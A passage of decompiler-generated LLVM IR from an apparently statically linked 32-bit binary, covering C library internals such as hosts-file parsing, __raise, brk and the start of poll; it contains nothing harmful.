  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8053169, i32* @ebx, align 4
  %v3_805316e104 = call i32 @fgets(i32 %v2_8053169, i32 128, i32 %v0_8053162103)
  store i32 %v3_805316e104, i32* @eax, align 4
  %v1_8053176105 = icmp eq i32 %v3_805316e104, 0
  %v1_8053178106 = icmp eq i1 %v1_8053176105, false
  br i1 %v1_8053178106, label %dec_label_pc_8052fef.preheader.lr.ph, label %dec_label_pc_805317e

dec_label_pc_8052fef.preheader.lr.ph:             ; preds = %dec_label_pc_8053162.preheader
  %v4_8053087 = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_8052fef.preheader

dec_label_pc_8052fee:                             ; preds = %dec_label_pc_8052ff9
  %v1_8052fee = add i32 %v0_8052fee57, 1
  store i32 %v1_8052fee, i32* @ebx, align 4
  %v1_8052fef = inttoptr i32 %v1_8052fee to i8*
  %v2_8052fef = load i8, i8* %v1_8052fef, align 1
  %v3_8052fef = zext i8 %v2_8052fef to i32
  %v5_8052fef = and i32 %v6_8052fef60, -256
  %v6_8052fef = or i32 %v3_8052fef, %v5_8052fef
  store i32 %v6_8052fef, i32* @ecx, align 4
  %v4_8052ff1 = icmp eq i8 %v2_8052fef, 0
  br i1 %v4_8052ff1, label %dec_label_pc_8053162.backedge, label %dec_label_pc_8052ff9

dec_label_pc_8052ff9:                             ; preds = %dec_label_pc_8052ff9.lr.ph, %dec_label_pc_8052fee
  %v6_8052fef60 = phi i32 [ %v6_8052fef55, %dec_label_pc_8052ff9.lr.ph ], [ %v6_8052fef, %dec_label_pc_8052fee ]
  %v2_8052fef59 = phi i8 [ %v2_8052fef52, %dec_label_pc_8052ff9.lr.ph ], [ %v2_8052fef, %dec_label_pc_8052fee ]
  %v1_8052fef58 = phi i8* [ %v1_8052fef51, %dec_label_pc_8052ff9.lr.ph ], [ %v1_8052fef, %dec_label_pc_8052fee ]
  %v0_8052fee57 = phi i32 [ %v0_8052fef.pre, %dec_label_pc_8052ff9.lr.ph ], [ %v1_8052fee, %dec_label_pc_8052fee ]
  %v2_8052ff9 = sext i8 %v2_8052fef59 to i32
  store i32 %v2_8052ff9, i32* @edx, align 4
  store i32 %v0_8052ffc.pre, i32* @eax, align 4
  %v2_8053001 = mul nsw i32 %v2_8052ff9, 2
  %v3_8053001 = add i32 %v0_8052ffc.pre, %v2_8053001
  %v4_8053001 = inttoptr i32 %v3_8053001 to i8*
  %v5_8053001 = load i8, i8* %v4_8053001, align 1
  %v6_8053001 = and i8 %v5_8053001, 32
  %v7_8053001 = icmp eq i8 %v6_8053001, 0
  %v1_8053005 = icmp eq i1 %v7_8053001, false
  br i1 %v1_8053005, label %dec_label_pc_8052fee, label %dec_label_pc_8053007

dec_label_pc_8053007:                             ; preds = %dec_label_pc_8052ff9
  %v10_8053007 = icmp eq i8 %v2_8052fef59, 10
  br i1 %v10_8053007, label %dec_label_pc_8053162.backedge, label %dec_label_pc_8053010

dec_label_pc_8053162.backedge:                    ; preds = %dec_label_pc_8052fef.preheader, %dec_label_pc_8052fee, %dec_label_pc_8053128, %dec_label_pc_8053157, %dec_label_pc_805312f, %dec_label_pc_8053007, %dec_label_pc_8053010, %dec_label_pc_80530e1
  %v0_8053162 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8053169, i32* @ebx, align 4
  %v3_805316e = call i32 @fgets(i32 %v2_8053169, i32 128, i32 %v0_8053162)
  store i32 %v3_805316e, i32* @eax, align 4
  %v1_8053176 = icmp eq i32 %v3_805316e, 0
  %v1_8053178 = icmp eq i1 %v1_8053176, false
  br i1 %v1_8053178, label %dec_label_pc_8052fef.preheader, label %dec_label_pc_805317e

dec_label_pc_8053010:                             ; preds = %dec_label_pc_8053007
  %v10_8053018 = icmp eq i8 %v2_8052fef59, 35
  %v1_805301b = icmp eq i1 %v10_8053018, false
  br i1 %v1_805301b, label %dec_label_pc_805306c.preheader, label %dec_label_pc_8053162.backedge

dec_label_pc_805306c.preheader:                   ; preds = %dec_label_pc_8053010
  %v2_805306c6 = load i8, i8* %v1_8052fef58, align 1
  %v3_805306c7 = icmp eq i8 %v2_805306c6, 0
  br i1 %v3_805306c7, label %dec_label_pc_8053078, label %dec_label_pc_8053071

dec_label_pc_8053022:                             ; preds = %dec_label_pc_8053071
  store i32 %stack_var_-196.013, i32* @eax, align 4
  %v1_8053026 = load i32, i32* @esp, align 4
  %v3_8053026 = mul nuw nsw i32 %stack_var_-196.013, 4
  %v4_8053026 = add nuw nsw i32 %v3_8053026, 152
  %v5_8053026 = add i32 %v4_8053026, %v1_8053026
  %v6_8053026 = inttoptr i32 %v5_8053026 to i32*
  store i32 %v0_8053026, i32* %v6_8053026, align 4
  %v0_8053030.pre = load i32, i32* @ebx, align 4
  %v4_8053030.pre = load i32, i32* @ecx, align 4
  %v1_805303061 = inttoptr i32 %v0_8053030.pre to i8*
  %v2_805303062 = load i8, i8* %v1_805303061, align 1
  %v3_805303063 = zext i8 %v2_805303062 to i32
  %v5_805303064 = and i32 %v4_8053030.pre, -256
  %v6_805303065 = or i32 %v3_805303063, %v5_805303064
  %v4_805303266 = icmp eq i8 %v2_805303062, 0
  br i1 %v4_805303266, label %dec_label_pc_805304f.preheader, label %dec_label_pc_8053036.lr.ph

dec_label_pc_8053036.lr.ph:                       ; preds = %dec_label_pc_8053022
  %v0_8053039.pre = load i32, i32* @global_var_8058218, align 8
  br label %dec_label_pc_8053036

dec_label_pc_805302f:                             ; preds = %dec_label_pc_8053044
  %v1_805302f = add i32 %v0_805302f67, 1
  store i32 %v1_805302f, i32* @ebx, align 4
  %v1_8053030 = inttoptr i32 %v1_805302f to i8*
  %v2_8053030 = load i8, i8* %v1_8053030, align 1
  %v3_8053030 = zext i8 %v2_8053030 to i32
  %v5_8053030 = and i32 %v6_805303069, -256
  %v6_8053030 = or i32 %v3_8053030, %v5_8053030
  %v4_8053032 = icmp eq i8 %v2_8053030, 0
  br i1 %v4_8053032, label %dec_label_pc_805304f.preheader, label %dec_label_pc_8053036

dec_label_pc_8053036:                             ; preds = %dec_label_pc_8053036.lr.ph, %dec_label_pc_805302f
  %v6_805303069 = phi i32 [ %v6_805303065, %dec_label_pc_8053036.lr.ph ], [ %v6_8053030, %dec_label_pc_805302f ]
  %v2_805303068 = phi i8 [ %v2_805303062, %dec_label_pc_8053036.lr.ph ], [ %v2_8053030, %dec_label_pc_805302f ]
  %v0_805302f67 = phi i32 [ %v0_8053030.pre, %dec_label_pc_8053036.lr.ph ], [ %v1_805302f, %dec_label_pc_805302f ]
  %v2_8053036 = sext i8 %v2_805303068 to i32
  store i32 %v2_8053036, i32* @edx, align 4
  store i32 %v0_8053039.pre, i32* @eax, align 4
  %v2_805303e = mul nsw i32 %v2_8053036, 2
  %v3_805303e = add i32 %v0_8053039.pre, %v2_805303e
  %v4_805303e = inttoptr i32 %v3_805303e to i8*
  %v5_805303e = load i8, i8* %v4_805303e, align 1
  %v6_805303e = and i8 %v5_805303e, 32
  %v7_805303e = icmp eq i8 %v6_805303e, 0
  %v1_8053042 = icmp eq i1 %v7_805303e, false
  br i1 %v1_8053042, label %dec_label_pc_805304f.preheader, label %dec_label_pc_8053044

dec_label_pc_8053044:                             ; preds = %dec_label_pc_8053036
  %v10_8053044 = icmp eq i8 %v2_805303068, 10
  %v1_8053047 = icmp eq i1 %v10_8053044, false
  br i1 %v1_8053047, label %dec_label_pc_805302f, label %dec_label_pc_805304f.preheader

dec_label_pc_805304f.preheader:                   ; preds = %dec_label_pc_8053044, %dec_label_pc_8053036, %dec_label_pc_805302f, %dec_label_pc_8053022
  %v0_805302f.lcssa = phi i32 [ %v0_8053030.pre, %dec_label_pc_8053022 ], [ %v1_805302f, %dec_label_pc_805302f ], [ %v0_805302f67, %dec_label_pc_8053036 ], [ %v0_805302f67, %dec_label_pc_8053044 ]
  %v6_8053030.lcssa = phi i32 [ %v6_805303065, %dec_label_pc_8053022 ], [ %v6_8053030, %dec_label_pc_805302f ], [ %v6_805303069, %dec_label_pc_8053036 ], [ %v6_805303069, %dec_label_pc_8053044 ]
  %v1_805304f75 = inttoptr i32 %v0_805302f.lcssa to i8*
  %v2_805304f76 = load i8, i8* %v1_805304f75, align 1
  %v3_805304f77 = zext i8 %v2_805304f76 to i32
  %v5_805304f78 = and i32 %v6_8053030.lcssa, -256
  %v6_805304f79 = or i32 %v3_805304f77, %v5_805304f78
  store i32 %v6_805304f79, i32* @ecx, align 4
  %v4_805305180 = icmp eq i8 %v2_805304f76, 0
  br i1 %v4_805305180, label %dec_label_pc_8053068, label %dec_label_pc_8053055

dec_label_pc_805304b:                             ; preds = %dec_label_pc_8053063, %dec_label_pc_8053055
  store i8 0, i8* %v1_805304f82, align 1
  %v0_805304e = load i32, i32* @ebx, align 4
  %v1_805304e = add i32 %v0_805304e, 1
  store i32 %v1_805304e, i32* @ebx, align 4
  %v4_805304f.pre = load i32, i32* @ecx, align 4
  %v1_805304f = inttoptr i32 %v1_805304e to i8*
  %v2_805304f = load i8, i8* %v1_805304f, align 1
  %v3_805304f = zext i8 %v2_805304f to i32
  %v5_805304f = and i32 %v4_805304f.pre, -256
  %v6_805304f = or i32 %v3_805304f, %v5_805304f
  store i32 %v6_805304f, i32* @ecx, align 4
  %v4_8053051 = icmp eq i8 %v2_805304f, 0
  br i1 %v4_8053051, label %dec_label_pc_8053068, label %dec_label_pc_8053055

dec_label_pc_8053055:                             ; preds = %dec_label_pc_805304f.preheader, %dec_label_pc_805304b
  %v2_805304f83 = phi i8 [ %v2_805304f, %dec_label_pc_805304b ], [ %v2_805304f76, %dec_label_pc_805304f.preheader ]
  %v1_805304f82 = phi i8* [ %v1_805304f, %dec_label_pc_805304b ], [ %v1_805304f75, %dec_label_pc_805304f.preheader ]
  %v0_805306c81 = phi i32 [ %v1_805304e, %dec_label_pc_805304b ], [ %v0_805302f.lcssa, %dec_label_pc_805304f.preheader ]
  %v2_8053055 = sext i8 %v2_805304f83 to i32
  store i32 %v2_8053055, i32* @edx, align 4
  %v0_8053058 = load i32, i32* @global_var_8058218, align 8
  store i32 %v0_8053058, i32* @eax, align 4
  %v2_805305d = mul nsw i32 %v2_8053055, 2
  %v3_805305d = add i32 %v0_8053058, %v2_805305d
  %v4_805305d = inttoptr i32 %v3_805305d to i8*
  %v5_805305d = load i8, i8* %v4_805305d, align 1
  %v6_805305d = and i8 %v5_805305d, 32
  %v7_805305d = icmp eq i8 %v6_805305d, 0
  %v1_8053061 = icmp eq i1 %v7_805305d, false
  br i1 %v1_8053061, label %dec_label_pc_805304b, label %dec_label_pc_8053063

dec_label_pc_8053063:                             ; preds = %dec_label_pc_8053055
  %v10_8053063 = icmp eq i8 %v2_805304f83, 10
  br i1 %v10_8053063, label %dec_label_pc_805304b, label %dec_label_pc_8053068

dec_label_pc_8053068:                             ; preds = %dec_label_pc_805304b, %dec_label_pc_8053063, %dec_label_pc_805304f.preheader
  %v0_805306c.lcssa = phi i32 [ %v0_805302f.lcssa, %dec_label_pc_805304f.preheader ], [ %v0_805306c81, %dec_label_pc_8053063 ], [ %v1_805304e, %dec_label_pc_805304b ]
  %v1_805304f.lcssa = phi i8* [ %v1_805304f75, %dec_label_pc_805304f.preheader ], [ %v1_805304f82, %dec_label_pc_8053063 ], [ %v1_805304f, %dec_label_pc_805304b ]
  %v4_8053068 = add nuw nsw i32 %stack_var_-196.013, 1
  %v2_805306c = load i8, i8* %v1_805304f.lcssa, align 1
  %v3_805306c = icmp eq i8 %v2_805306c, 0
  br i1 %v3_805306c, label %dec_label_pc_8053078, label %dec_label_pc_8053071

dec_label_pc_8053071:                             ; preds = %dec_label_pc_805306c.preheader, %dec_label_pc_8053068
  %v0_8053026 = phi i32 [ %v0_805306c.lcssa, %dec_label_pc_8053068 ], [ %v0_8052fee57, %dec_label_pc_805306c.preheader ]
  %stack_var_-196.013 = phi i32 [ %v4_8053068, %dec_label_pc_8053068 ], [ 0, %dec_label_pc_805306c.preheader ]
  %v7_8053076 = icmp sgt i32 %stack_var_-196.013, 4
  br i1 %v7_8053076, label %dec_label_pc_8053078, label %dec_label_pc_8053022

dec_label_pc_8053078:                             ; preds = %dec_label_pc_8053068, %dec_label_pc_8053071, %dec_label_pc_805306c.preheader
  %stack_var_-196.0.lcssa = phi i32 [ 0, %dec_label_pc_805306c.preheader ], [ %v4_8053068, %dec_label_pc_8053068 ], [ %stack_var_-196.013, %dec_label_pc_8053071 ]
  store i32 %tmp, i32* @edi, align 4
  %v0_805307f = load i32, i32* @esi, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_80574a7.276 to i32), i32* %stack_var_-216, align 4
  %v5_8053087 = call i32 @__GI_strcoll(i8* %v4_8053087, i32 ptrtoint ([11 x i8]* @global_var_80574a7.276 to i32), i32 %v0_805307f, i32 %v0_805307f)
  store i32 %v5_8053087, i32* @eax, align 4
  store i32 1, i32* @esi, align 4
  %v1_8053094 = icmp eq i32 %v5_8053087, 0
  br i1 %v1_8053094, label %dec_label_pc_80530bc.preheader, label %dec_label_pc_80530cd

dec_label_pc_80530bc.preheader:                   ; preds = %dec_label_pc_8053078
  %v5_80530c090 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_80530c090, label %dec_label_pc_80530c2.lr.ph, label %dec_label_pc_80530cd

dec_label_pc_80530c2.lr.ph:                       ; preds = %dec_label_pc_80530bc.preheader
  %v0_80530c2.pre = load i32, i32* @global_var_805eb74.211, align 4
  br label %dec_label_pc_80530c2

dec_label_pc_805309a:                             ; preds = %dec_label_pc_80530c2
  %v2_805309d = mul i32 %v1_805309d91, 4
  %v4_805309d = add i32 %v2_805309d, %v3_805309d
  %v5_805309d = inttoptr i32 %v4_805309d to i32*
  %v6_805309d = load i32, i32* %v5_805309d, align 4
  %v1_80530a4 = inttoptr i32 %v6_805309d to i8*
  %v2_80530a4 = call i32 @__GI_strdup(i8* %v1_80530a4)
  %v0_80530a9 = load i32, i32* @esi, align 4
  %v1_80530a9 = add i32 %v0_80530a9, 1
  store i32 %v1_80530a9, i32* @esi, align 4
  %v1_80530aa = load i32, i32* @ebx, align 4
  %v2_80530aa = mul i32 %v1_80530aa, 4
  %v3_80530aa = add i32 %v2_80530aa, 134605672
  %v4_80530aa = inttoptr i32 %v3_80530aa to i32*
  store i32 %v2_80530a4, i32* %v4_80530aa, align 4
  %v0_80530b1 = load i32, i32* @ebx, align 4
  %v1_80530b1 = add i32 %v0_80530b1, 1
  store i32 %v1_80530b1, i32* @eax, align 4
  store i32 %v1_80530b1, i32* @global_var_805eb74.211, align 4
  %v0_80530bc.pre = load i32, i32* @esi, align 4
  %v5_80530c0 = icmp slt i32 %v0_80530bc.pre, %stack_var_-196.0.lcssa
  br i1 %v5_80530c0, label %dec_label_pc_80530c2, label %dec_label_pc_80530cd

dec_label_pc_80530c2:                             ; preds = %dec_label_pc_80530c2.lr.ph, %dec_label_pc_805309a
  %v0_80530c2 = phi i32 [ %v0_80530c2.pre, %dec_label_pc_80530c2.lr.ph ], [ %v1_80530b1, %dec_label_pc_805309a ]
  %v1_805309d91 = phi i32 [ 1, %dec_label_pc_80530c2.lr.ph ], [ %v0_80530bc.pre, %dec_label_pc_805309a ]
  store i32 %v0_80530c2, i32* @ebx, align 4
  %v7_80530cb = icmp sgt i32 %v0_80530c2, 2
  br i1 %v7_80530cb, label %dec_label_pc_80530cd, label %dec_label_pc_805309a

dec_label_pc_80530cd:                             ; preds = %dec_label_pc_80530bc.preheader, %dec_label_pc_805309a, %dec_label_pc_80530c2, %dec_label_pc_8053078
  %v0_80530cd = load i32, i32* @ebx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80574b2.277 to i32), i32* %stack_var_-216, align 4
  %v0_80530d4 = load i32, i32* @edi, align 4
  %v4_80530d5 = inttoptr i32 %v0_80530d4 to i8*
  %v5_80530d5 = call i32 @__GI_strcoll(i8* %v4_80530d5, i32 ptrtoint ([7 x i8]* @global_var_80574b2.277 to i32), i32 %v0_80530cd, i32 %v0_80530cd)
  store i32 %v5_80530d5, i32* @eax, align 4
  %v1_80530dd = icmp eq i32 %v5_80530d5, 0
  br i1 %v1_80530dd, label %dec_label_pc_805311f.preheader, label %dec_label_pc_80530e1

dec_label_pc_80530e1:                             ; preds = %dec_label_pc_80530cd
  %v0_80530e1 = load i32, i32* @ecx, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_80574b9.278 to i32), i32* %stack_var_-216, align 4
  %v0_80530e8 = load i32, i32* @edi, align 4
  %v4_80530e9 = inttoptr i32 %v0_80530e8 to i8*
  %v5_80530e9 = call i32 @__GI_strcoll(i8* %v4_80530e9, i32 ptrtoint ([7 x i8]* @global_var_80574b9.278 to i32), i32 %v0_80530e1, i32 %v0_80530e1)
  %v1_80530f1 = icmp eq i32 %v5_80530e9, 0
  br i1 %v1_80530f1, label %dec_label_pc_805311f.preheader, label %dec_label_pc_8053162.backedge

dec_label_pc_805311f.preheader:                   ; preds = %dec_label_pc_80530cd, %dec_label_pc_80530e1
  %v0_805311f92 = load i32, i32* @global_var_805eb78.271, align 8
  %tmp4594 = icmp slt i32 %v0_805311f92, 1
  %tmp4695 = icmp eq i1 %tmp4594, false
  br i1 %tmp4695, label %dec_label_pc_80530f7, label %dec_label_pc_8053128

dec_label_pc_80530f7:                             ; preds = %dec_label_pc_805311f.preheader, %dec_label_pc_80530f7.dec_label_pc_80530f7_crit_edge
  %v0_805311f96 = phi i32 [ %v0_805311f, %dec_label_pc_80530f7.dec_label_pc_80530f7_crit_edge ], [ %v0_805311f92, %dec_label_pc_805311f.preheader ]
  %v1_80530f7 = add i32 %v0_805311f96, -1
  store i32 %v1_80530f7, i32* @global_var_805eb78.271, align 8
  %v1_8053100 = mul i32 %v1_80530f7, 4
  %v2_8053100 = add i32 %v1_8053100, 134605656
  %v3_8053100 = inttoptr i32 %v2_8053100 to i32*
  %v4_8053100 = load i32, i32* %v3_8053100, align 4
  %v1_8053107 = call i32 @free(i32 %v4_8053100)
  %v0_805310c = load i32, i32* @global_var_805eb78.271, align 8
  %v1_8053114 = mul i32 %v0_805310c, 4
  %v2_8053114 = add i32 %v1_8053114, ptrtoint (i32* @global_var_805eb58.279 to i32)
  %v3_8053114 = inttoptr i32 %v2_8053114 to i32*
  store i32 0, i32* %v3_8053114, align 4
  %v0_805311f = load i32, i32* @global_var_805eb78.271, align 8
  %tmp45 = icmp slt i32 %v0_805311f, 1
  %tmp46 = icmp eq i1 %tmp45, false
  br i1 %tmp46, label %dec_label_pc_80530f7.dec_label_pc_80530f7_crit_edge, label %dec_label_pc_8053128

dec_label_pc_80530f7.dec_label_pc_80530f7_crit_edge: ; preds = %dec_label_pc_80530f7
  br label %dec_label_pc_80530f7

dec_label_pc_8053128:                             ; preds = %dec_label_pc_80530f7, %dec_label_pc_805311f.preheader
  %v0_805311f.lcssa = phi i32 [ %v0_805311f92, %dec_label_pc_805311f.preheader ], [ %v0_805311f, %dec_label_pc_80530f7 ]
  store i32 1, i32* @esi, align 4
  %v5_8053155100 = icmp sgt i32 %stack_var_-196.0.lcssa, 1
  br i1 %v5_8053155100, label %dec_label_pc_8053157, label %dec_label_pc_8053162.backedge

dec_label_pc_805312f:                             ; preds = %dec_label_pc_8053157
  %v2_8053132 = mul i32 %v1_8053132102, 4
  %v4_8053132 = add i32 %v2_8053132, %v3_805309d
  %v5_8053132 = inttoptr i32 %v4_8053132 to i32*
  %v6_8053132 = load i32, i32* %v5_8053132, align 4
  %v1_8053139 = inttoptr i32 %v6_8053132 to i8*
  %v2_8053139 = call i32 @__GI_strdup(i8* %v1_8053139)
  %v0_805313e = load i32, i32* @esi, align 4
  %v1_805313e = add i32 %v0_805313e, 1
  store i32 %v1_805313e, i32* @esi, align 4
  %v1_805313f = load i32, i32* @ebx, align 4
  %v2_805313f = mul i32 %v1_805313f, 4
  %v3_805313f = add i32 %v2_805313f, 134605656
  %v4_805313f = inttoptr i32 %v3_805313f to i32*
  store i32 %v2_8053139, i32* %v4_805313f, align 4
  %v0_8053146 = load i32, i32* @ebx, align 4
  %v1_8053146 = add i32 %v0_8053146, 1
  store i32 %v1_8053146, i32* @global_var_805eb78.271, align 8
  %v0_8053151.pre = load i32, i32* @esi, align 4
  %v5_8053155 = icmp slt i32 %v0_8053151.pre, %stack_var_-196.0.lcssa
  br i1 %v5_8053155, label %dec_label_pc_8053157, label %dec_label_pc_8053162.backedge

dec_label_pc_8053157:                             ; preds = %dec_label_pc_8053128, %dec_label_pc_805312f
  %v1_8053132102 = phi i32 [ %v0_8053151.pre, %dec_label_pc_805312f ], [ 1, %dec_label_pc_8053128 ]
  %v0_8053157101 = phi i32 [ %v1_8053146, %dec_label_pc_805312f ], [ %v0_805311f.lcssa, %dec_label_pc_8053128 ]
  store i32 %v0_8053157101, i32* @ebx, align 4
  %v7_8053160 = icmp sgt i32 %v0_8053157101, 3
  br i1 %v7_8053160, label %dec_label_pc_8053162.backedge, label %dec_label_pc_805312f

dec_label_pc_8052fef.preheader:                   ; preds = %dec_label_pc_8052fef.preheader.lr.ph, %dec_label_pc_8053162.backedge
  %v0_8052fef.pre = load i32, i32* @ebx, align 4
  %v4_8052fef.pre = load i32, i32* @ecx, align 4
  %v1_8052fef51 = inttoptr i32 %v0_8052fef.pre to i8*
  %v2_8052fef52 = load i8, i8* %v1_8052fef51, align 1
  %v3_8052fef53 = zext i8 %v2_8052fef52 to i32
  %v5_8052fef54 = and i32 %v4_8052fef.pre, -256
  %v6_8052fef55 = or i32 %v3_8052fef53, %v5_8052fef54
  store i32 %v6_8052fef55, i32* @ecx, align 4
  %v4_8052ff156 = icmp eq i8 %v2_8052fef52, 0
  br i1 %v4_8052ff156, label %dec_label_pc_8053162.backedge, label %dec_label_pc_8052ff9.lr.ph

dec_label_pc_8052ff9.lr.ph:                       ; preds = %dec_label_pc_8052fef.preheader
  %v0_8052ffc.pre = load i32, i32* @global_var_8058218, align 8
  br label %dec_label_pc_8052ff9

dec_label_pc_805317e:                             ; preds = %dec_label_pc_8053162.backedge, %dec_label_pc_8053162.preheader
  %v0_8053181 = load i32, i32* @ebp, align 4
  %v1_8053182 = inttoptr i32 %v0_8053181 to i16*
  %v2_8053182 = call i32 @__GI_fclose(i16* %v1_8053182)
  br label %dec_label_pc_8053197

dec_label_pc_805318c:                             ; preds = %dec_label_pc_8052fcb
  %v0_805318c = call i32 @__GI___h_errno_location()
  %v1_8053191 = inttoptr i32 %v0_805318c to i32*
  store i32 3, i32* %v1_8053191, align 4
  br label %dec_label_pc_8053197

dec_label_pc_8053197:                             ; preds = %entry, %dec_label_pc_805317e, %dec_label_pc_805318c
  store i32 1, i32* %stack_var_-216, align 4
  store i32 %v2_8052f84, i32* @eax, align 4
  %v2_80531a3 = call i32 @__pthread_return_void(i32 %v2_8052f84, i32 1)
  store i32 %v0_8052f70, i32* @ebp, align 4
  ret i32 %v2_80531a3

; uselistorder directives
  uselistorder i32 %v0_8052ffc.pre, { 1, 0 }
  uselistorder i32 %v6_8052fef55, { 1, 0 }
  uselistorder i8 %v2_8052fef52, { 1, 2, 0 }
  uselistorder i8* %v1_8052fef51, { 1, 0 }
  uselistorder i32 %v0_8052fef.pre, { 1, 0 }
  uselistorder i32 %v0_805311f, { 0, 2, 1 }
  uselistorder i32 %v1_80530f7, { 1, 0 }
  uselistorder i32 %v0_80530c2, { 1, 0 }
  uselistorder i32 %v0_80530bc.pre, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.lcssa, { 3, 1, 2, 0 }
  uselistorder i32 %stack_var_-196.013, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v2_8053055, { 1, 0 }
  uselistorder i8 %v2_805304f83, { 1, 0 }
  uselistorder i32 %v2_8053036, { 1, 0 }
  uselistorder i8 %v2_805303068, { 1, 0 }
  uselistorder i32 %v1_805302f, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8052ff9, { 1, 0 }
  uselistorder i32 %v1_8052fee, { 1, 0, 2 }
  uselistorder i32 %v2_8053169, { 2, 3, 0, 1 }
  uselistorder i32 %v2_8052fd7, { 1, 0 }
  uselistorder i32 %v2_8052fb9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-216, { 1, 3, 4, 5, 2, 0, 6, 7, 9, 8 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @__GI___h_errno_location, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 (i32)* @free, { 18, 16, 15, 14, 13, 12, 11, 10, 26, 25, 24, 23, 2, 9, 8, 7, 6, 5, 0, 17, 19, 22, 21, 20, 4, 3, 1 }
  uselistorder i32* @global_var_805eb78.271, { 1, 2, 3, 4, 0, 5, 6, 7 }
  uselistorder i32 152, { 1, 0, 2, 3 }
  uselistorder i8 10, { 0, 1, 2, 14, 3, 4, 5, 6, 7, 8, 15, 9, 16, 10, 11, 12, 13, 17 }
  uselistorder i32 164, { 1, 0 }
  uselistorder i32* @global_var_805eb74.211, { 1, 0, 2, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8058488.210 to i32), { 1, 3, 4, 5, 6, 7, 8, 0, 2, 9 }
  uselistorder label %dec_label_pc_8053197, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052fef.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8053157, { 1, 0 }
  uselistorder label %dec_label_pc_80530f7, { 1, 0 }
  uselistorder label %dec_label_pc_805311f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_80530cd, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_80530c2, { 1, 0 }
  uselistorder label %dec_label_pc_8053078, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053071, { 1, 0 }
  uselistorder label %dec_label_pc_8053068, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8053055, { 1, 0 }
  uselistorder label %dec_label_pc_8053036, { 1, 0 }
  uselistorder label %dec_label_pc_8053162.backedge, { 0, 3, 4, 2, 7, 6, 5, 1 }
  uselistorder label %dec_label_pc_8053162.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %v9_80531d7 = inttoptr i32 %arg3 to i32*
  %v10_80531d7 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_80531d7, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7)
  ret i32 %v10_80531d7
}

define i32 @__raise(i32 %arg1) local_unnamed_addr {
entry:
  %v0_80531e3 = call i32 @__libc_getpid()
  %v2_80531ef = call i32 @kill(i32 %v0_80531e3, i32 %arg1)
  ret i32 %v2_80531ef

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 3, 1, 2 }
  uselistorder i32 ()* @__libc_getpid, { 0, 3, 2, 1 }
}

define i32 @_dl_aux_init() local_unnamed_addr {
entry:
  %v0_80531f8 = load i32, i32* @eax, align 4
  %v1_80531f8 = add i32 %v0_80531f8, 28
  %v2_80531f8 = inttoptr i32 %v1_80531f8 to i32*
  %v3_80531f8 = load i32, i32* %v2_80531f8, align 4
  store i32 %v3_80531f8, i32* @global_var_805eb7c.280, align 4
  %v1_8053201 = add i32 %v0_80531f8, 44
  %v2_8053201 = inttoptr i32 %v1_8053201 to i32*
  %v3_8053201 = load i32, i32* %v2_8053201, align 4
  store i32 %v3_8053201, i32* @global_var_805eb80.281, align 128
  ret i32 %v3_8053201
}

define i32 @__GI_brk(i32 %arg1) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_805320c = load i32, i32* @ebx, align 4
  store i32 %v0_805320c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ecx.global-to-local, align 4
  %v1_805321f = call i32 @int80_syscall(i32 45)
  store i32 0, i32* %ecx.global-to-local, align 4
  store i32 %v1_805321f, i32* @global_var_805e744.258, align 4
  %v7_805322a = icmp ult i32 %v1_805321f, %arg1
  %v1_805322c = icmp eq i1 %v7_805322a, false
  br i1 %v1_805322c, label %dec_label_pc_805323c, label %dec_label_pc_805322e

dec_label_pc_805322e:                             ; preds = %entry
  %v0_805322e = load i32, i32* %stack_var_-4, align 4
  %v1_805322e = call i32 @__errno_location(i32 %v0_805322e)
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_8053236 = inttoptr i32 %v1_805322e to i32*
  store i32 12, i32* %v1_8053236, align 4
  %v0_805323c.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_805323c

dec_label_pc_805323c:                             ; preds = %entry, %dec_label_pc_805322e
  %v0_805323c = phi i32 [ 0, %entry ], [ %v0_805323c.pre, %dec_label_pc_805322e ]
  %v2_8053240 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053240, i32* @ebx, align 4
  ret i32 %v0_805323c

; uselistorder directives
  uselistorder i32 %v1_805321f, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32* @global_var_805e744.258, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805323c, { 1, 0 }
}

define i32 @__libc_poll() local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8053244 = load i32, i32* @edi, align 4
  store i32 %v0_8053244, i32* %stack_var_-4, align 4
  store i32 %tmp4, i32* %edi.global-to-local, align 4
  %v0_8053254 = load i32, i32* @ebx, align 4
